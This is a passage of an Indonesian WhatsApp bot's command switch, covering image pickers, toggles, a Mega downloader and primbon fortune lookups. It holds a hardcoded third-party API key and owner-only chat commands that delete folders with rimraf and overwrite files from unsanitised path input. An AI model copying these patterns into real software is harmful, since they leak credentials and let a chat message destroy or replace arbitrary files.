if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
Al.sendMessage(from, { react: { text: "⌛", key: m.key } })
const c = await covid()
var { cases, death, healed } = c[0]
Al.sendMessage(from, { text: `*Covid Info*\n\nCase : ${cases}\nDead : ${death}\nHealed : ${healed}\n` }, {quoted: m})
break;
//========================
case 'autotyping':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args.length < 1) return m.reply(`Contoh ${prefix + command} on/off`)
if (q === 'on') {
autoTyping = true
m.reply(`Successfully Activated AutoTyping`)
} else if (q === 'off') {
autoTyping = false
m.reply(`Successfully Deactivation AutoTyping`)
}
break
//========================
case 'autobio':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args.length < 1) return m.reply(`Contoh ${prefix + command} on/off`)
if (q == 'on') {
autobio = true
m.reply(`Successfully Activated AutoBio`)
} else if (q == 'off') {
autobio = false
m.reply(`Successfully Deactivation AutoBio`)
}
break
//========================
case 'antispam':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args.length < 1) return m.reply(`Contoh ${prefix + command} on/off`)
if (q == 'on') {
antispam = true
m.reply(`Successfully Activated AntiSpam`)
} else if (q == 'off') {
antispam = false
m.reply(`Successfully Deactivation AntiSpam`)
}
break
//========================
case 'autoreadsw':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args[0] == 'on'){
if (global.autoreadsw) return m.reply('Sudah On!')
global.autoreadsw = true
m.reply('Fitur AutoRead SW telah di Aktifkan')
} else if (args[0] == 'off'){
if (!global.autoreadsw) return m.reply('Sudah Off!')
global.autoreadsw = false
m.reply('Fitur AutoRead SW telah di Matikan')
} else m.reply(`Gunakan dengan ${prefix+command} on/off`)
break
//========================
case 'delcase': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
function delCase(filePath, caseName) {
try {
let code = fs.readFileSync(filePath, 'utf8');
const caseIndex = code.indexOf(`case '${caseName}':`);
if (caseIndex !== -1) {
let startIndex = code.lastIndexOf('case', caseIndex);
let endIndex = code.indexOf('break', caseIndex);
let afterBreakIndex = code.indexOf(';', endIndex);
if (afterBreakIndex !== -1) {
afterBreakIndex += 1; // Tambahkan satu karakter untuk meEnter titik koma
} else {
afterBreakIndex = endIndex + 5; // Tambahkan panjang dari "break" tanpa titik koma
}
let before = code.slice(0, startIndex);
let after = code.slice(afterBreakIndex);
let newCode = before + after;
fs.writeFileSync(filePath, newCode, 'utf8');
return true;
} else {
console.error(`Tidak dapat menemukan case dengan nama '${caseName}'.`);
return false;
}
} catch (err) {
console.error(err);
return false;
}
}
if (!isCreator) {
return
}
if(!text) return m.reply(`Enter Nama Case!`)
let data = await delCase('AiBotzz.js', text)
if(data) {
m.reply(`Berhasil Menghapus Case ${text}`)
} else {
m.reply(`${data}`)
}
}
break
//========================
case 'blur':
case 'blurimg': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isMedia) return m.reply("Mana Gambar Nya ?")
let media = await Al.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
Al.sendMessage(m.chat, {
image: { url: `https://vihangayt.me/maker/blur?url=${anu}` }, caption: "Ini Dia Bang!" }, { quoted: m}) 
}
break
//========================
case 'txt2vidio':
case 'txt2video':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example : ${prefix + command} Enter Prompt`)
Al.sendMessage(from, {react: {text: "💗", key: m.key}})
axios
.get(`https://api.maelyn.my.id/api/txt2video?prompt=${text}&apikey=BFnyTpTCdI`)
.then(({ data }) => {
Al.sendMessage(m.chat, {video:{url: `${data.result.name}`}, caption: `*DONE*\n\n*Ukuran :* ${data.result.size}`, fileLength: 97656250 }, {quoted:m })
})
break
//========================
case 'dellimit': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Gunakan dengan cara :\n${prefix+command} *@Tag Angka*\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/Reply target yang mau di ${command}`)
if (!args[1]) return m.reply(`Enter nominal nya!\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
if (args[1] === 'infinity') return m.reply(`Wkwk gua gak bisa diTipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\n*Contoh :*\n${prefix+command} @${m.sender.split("@")[0]} 100`)
delLimit(users, parseInt(args[1]), limit)
Al.sendTextWithMentions(m.chat, `*SUKSES DELLIMIT*\n\n*Kepada :* @${users.split("@")[0]}\n*Sebesar :* ${args[1]} Limit\n\nSilahkan ketik *.limit*\nTo checks Limit`, floc)
}
break
//========================
case 'anticall':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (args[0] == 'on'){
if (global.anticall) return m.reply('Already active beforehand!')
global.anticall = true
m.reply('Successfully Activated AntiCall')
} else if (args[0] == 'off'){
if (!global.anticall) return m.reply('Sudah Nonaktif Sebelumnya!')
global.anticall = false
m.reply('Successfully Deactivation AntiCall')
} else m.reply('Mau On/Off Nie?')
break
//========================
case 'button':
let teskd = 'Halo, aku\n'
const sections = [{
title: "LIST MENU",
rows: [
{
title: "🙇 MENU BOT",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "🚀 ROOM CONFES / MENFES",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "💰 CEK LIMIT SAYA",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "👤 OWNER",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "📢 INFO BOT CONFES",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "🏷️ BUY PREMIUM LIMIT",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "💸 DONASI",
rowId: '',
description: ''
}
]
}, 
{
title: " ",
rows: [
{
title: "📢 INFO GROUP WHATSAPP",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "💻 SOURCE CODE",
rowId: '',
description: ''
}
]
},         
]
const listMessage = {
text: teskd,
footer: "Mes",
title: "MEMES",
buttonText: "LIST MENU",
sections
}
Al.sendMessage(from, listMessage, {quoted: m})
break
//========================
case 'getlinkgc': 
case 'getlinkgroup': 
case 'getlinkgrup':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply('ID Grup Nya Mana?')
let getlinkgc = await Al.groupInviteCode(text).catch((err) => reply('```BOT BUKAN ADMIN DI GC TERSEBUT [ ! ]```'))
m.reply(`https://chat.whatsapp.com/${getlinkgc}\n\n`)
}
break
//========================
case 'timergc': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
if (!text) return m.reply(`PILIH WAKTU RESET CHAT\n\n*Contoh :*\n${prefix+command} 90\n${prefix+command} 24\n${prefix+command}7\n${prefix+command} Mati`)
if (args[0] === "24") {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
Al.groupToggleEphemeral(m.chat, 1*24*3600)
m.reply('Timer di set ke 24 jam')
}
if (args[0] === "7") {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
Al.groupToggleEphemeral(m.chat, 7*24*3600)
m.reply('Timer di set ke 7 hari')
}
if (args[0] === "90") {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
Al.groupToggleEphemeral(m.chat, 90*24*3600)
m.reply('Timer di set ke 90 hari')
}
if (args[0] === "mati") {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
Al.groupToggleEphemeral(m.chat, 0*24*3600)
m.reply('Timer telah di matikan')
}
}
break
//========================
case 'info': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let txtnya = `Restart Otomatis Itu Biar Kalian Yang Panel Nya Butud Bisa Ngindarin Bot Berhenti Sendiri Secara Tiba-tiba, Jadi Saran Gw Ini Dinyalain Aja Ya\n\nBiar Kalian Yang Misalnya Kuota Abis Eh Botnya Mati Terus Lu Mau Nyalain Tapi Gak Ada Kuota Nya 😂\n\n© ${global.wm}`
m.reply(txtnya)
}
break
//========================
case 'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix+command} teks`)
const text = `${teks}`
const username = await Al.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await Al.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
Al.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
//========================
case 'delfolder':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`*• Example* : ${prefix + command} userclone/session`)
rimraf.sync(`./${text}`)
m.reply(`Berhasil hapus folder ${q}`)
break
//========================
case 'gfl': case "gantifile":{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text.includes("./")) return m.reply(`*• Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return m.reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload...`)
await delay(2000)
m.reply(`Berhasil mengganti file ${q}`)
}
break
//========================
case 'doggo':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
//========================
case 'justina':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break
//========================
case 'kayes':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
//========================
case 'kpop':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/kpop.json'))
var ll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: ll.url } }, { quoted: m })
break
//========================
case 'notnot':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/notnot.json'))
var lll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lll.url } }, { quoted: m })
break
//========================
case 'car':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/car.json'))
var llll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: llll.url } }, { quoted: m })
break
//========================
case 'couplepic': case 'couplepicture':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lllll.url } }, { quoted: m })
break
//========================
case 'profilepic':  case 'profilepicture':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/profile.json'))
var llllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: llllll.url } }, { quoted: m })
break
//========================
case 'pubg':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lllllll.url } }, { quoted: m })
break
//========================
case 'rose':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: llllllll.url } }, { quoted: m })
break
//========================
case 'ryujin':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lllllllll.url } }, { quoted: m })
break
//========================
case 'ulzzangboy':
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: llllllllll.url } }, { quoted: m })
break
//========================
case 'ulzzanggirl':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lllllllllll.url } }, { quoted: m })
break
//========================
case 'wallml': case 'wallpaperml':case 'mobilelegend':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: llllllllllll.url } }, { quoted: m })
break
//========================
case 'wallpaperphone': 
case 'wallphone':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply('_Loading..._')
var notnot = JSON.parse(fs.readFileSync('./search/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Al.sendMessage(m.chat, { caption: 'Done Bang', image: { url: lllllllllllll.url } }, { quoted: m })
break
//========================
case 'megadl':
const { File } = require('megajs')
const { fileTypeFromBuffer } = require('file-type')
Al.room = Al.room ? Al.room : {}
if (!args[0]) return m.reply(`Masukan Url Nya!\n\n*Contoh :*\n${prefix + command} _Url_`)
let asw = 'mega_' + m.sender
if (asw in Al.room) return m.reply('Kamu Masih Mendownload!')
Al.room[asw] = true
var file = File.fromURL(args[0])
m.reply('_Loading..._')
try {
file = await file.loadAttributes()
var data = await file.downloadBuffer()
var mimetype = await fileTypeFromBuffer(data)
await Al.sendMessage(m.chat, { document: data, fileName: file.name, mimetype }, { quoted: m })
} catch (e) {
console.log(e)
return m.reply('Internal Error')
} finally {
delete Al.room[asw]
}
break
//========================
case 'ramalanjodoh': case 'ramaljodoh': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} yunzhie, 7, 7, 2024, 𝙈𝘼𝙉𝙐𝙇, 16, 11, 2024`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama Anda :* ${anu.message.nama_anda.nama}\n*Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n*Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n*Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n*Hasil :* ${anu.message.result}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} Esta, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama :* ${anu.message.nama}\n*Lahir :* ${anu.message.tgl_lahir}\n*Life Path :* ${anu.message.life_path}\n*Destiny :* ${anu.message.destiny}\n*Destiny Desire :* ${anu.message.destiny_desire}\n*Personality :* ${anu.message.personality}\n*Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} Wan|Esta`)
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendImage(from,  anu.message.gambar, `*Nama Anda :* ${anu.message.nama_anda}\n*Nama Pasangan :* ${anu.message.nama_pasangan}\n*Sisi Positif :* ${anu.message.sisi_positif}\n*Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 6, 12, 2020`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Tanggal Pernikahan :* ${anu.message.tanggal}\n*karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!ext)return m.reply(`Example : ${prefix+ command} 28, 12, 2021`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Lahir :* ${anu.message.hari_lahir}\n*Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Lahir :* ${anu.message.hari_lahir}\n*Rezeki :* ${anu.message.rejeki}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Lahir :* ${anu.message.hari_lahir}\n*Pekerjaan :* ${anu.message.pekerjaan}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Analisa :* ${anu.message.analisa}\n*Angka Akar :* ${anu.message.angka_akar}\n*Sifat :* ${anu.message.sifat}\n*Elemen :* ${anu.message.elemen}\n*Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Analisa :* ${anu.message.analisa}\n*Sektor :* ${anu.message.sektor}\n*Elemen :* ${anu.message.elemen}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendImage(from, anu.message.image, `*Lahir :* ${anu.message.tgl_lahir}\n*Simbol Tarot :* ${anu.message.simbol_tarot}\n*Arti :* ${anu.message.arti}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama :* ${anu.message.nama}\n*Lahir :* ${anu.message.tahun_lahir}\n*Gender :* ${anu.message.jenis_kelamin}\n*Angka Kua :* ${anu.message.angka_kua}\n*Kelompok :* ${anu.message.kelompok}\n*Karakter :* ${anu.message.karakter}\n*Sektor Baik :* ${anu.message.sektor_baik}\n*Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Lahir :* ${anu.message.tgl_lahir}\n*Kala Tinantang :* ${anu.message.kala_tinantang}\n*Info :* ${anu.message.info}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Lahir :* ${anu.message.tgl_lahir}\n*Hasil :* ${anu.message.result}\n*Info :* ${anu.message.info}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Hari Lahir :* ${anu.message.hari_lahir}\n*Tanggal Lahir :* ${anu.message.tgl_lahir}\n*Hari Naas :* ${anu.message.hari_naas}\n*Info :* ${anu.message.catatan}\n*Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Hari Lahir :* ${anu.message.hari_lahir}\n*Tanggal Lahir :* ${anu.message.tgl_lahir}\n*Arah Naga Hari :* ${anu.message.arah_naga_hari}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Hari Lahir :* ${anu.message.hari_lahir}\n*tanggal Lahir :* ${anu.message.tgl_lahir}\n*Arah Rezeki :* ${anu.message.arah_rejeki}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} Aruna, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama :* ${anu.message.nama}\n*Lahir :* ${anu.message.tgl_lahir}\n*Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n*Hasil :* ${anu.message.result}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Tanggal :* ${anu.message.tanggal}\n*Jumlah Neptu :* ${anu.message.jumlah_neptu}\n*Watak Hari :* ${anu.message.watak_hari}\n*Naga Hari :* ${anu.message.naga_hari}\n*Jam Baik :* ${anu.message.jam_baik}\n*Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} HW MODS WA, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama :* ${anu.message.nama}\n*Lahir :* ${anu.message.tgl_lahir}\n*Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} HW MODS WA, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Nama :* ${anu.message.nama}\n*Lahir :* ${anu.message.tgl_lahir}\n*Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} 12, 1, 2022`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Tanggal :* ${anu.message.tgl_memancing}\n*Hasil :* ${anu.message.result}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
